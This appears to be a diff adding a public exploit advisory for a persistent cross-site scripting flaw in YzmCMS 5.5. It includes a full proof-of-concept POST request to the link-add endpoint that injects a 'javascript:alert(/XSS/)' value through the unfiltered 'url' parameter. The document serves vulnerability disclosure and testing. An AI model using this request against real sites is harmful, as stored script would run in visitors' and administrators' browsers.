@@ -1,0 +1,34 @@
+# Exploit Title: YzmCMS 5.5 - 'url' Persistent Cross-Site Scripting
+# Google Dork: N/A
+# Date: 2020-03-10
+# Exploit Author: En
+# Vendor Homepage: https://github.com/yzmcms/yzmcms
+# Software Link: https://github.com/yzmcms/yzmcms
+# Version: V5.5
+# Category: Web Application
+# Patched Version: unpatched
+# Tested on: Win10x64
+# Platform: PHP
+# CVE : N/A
+#Exploit Author: En_dust
+
+#Description：
+#The add function defined in the Application/link/controller/link.class.php file does not filter the ‘url’ parameter, causing malicious code to be executed.
+
+
+#PoC：
+POST /yzmcms/link/link/add.html HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: http://127.0.0.1/yzmcms/link/link/add.html
+Content-Length: 130
+Cookie: CNZZDATA1261218610=2106045875-1559549499-%7C1569374982; PHPSESSID=fr095t87brjfc0l7d7sgj8oml4; yzmphp_adminid=45dfDWXXjGQg2Ce7Yg7oJZbld7iy8SN43sy2SKjq; yzmphp_adminname=7e49R0HXcjLHqBu5wgd9vXbD_D-Bq3Uq8TLw5UNpi8lIAw
+DNT: 1
+Connection: close
+
+name=evalWebsite&url=javascript%3Aalert(%2FXSS%2F)&username=&email=&linktype=0&logo=&typeid=0&msg=&listorder=1&status=1&dosubmit=1
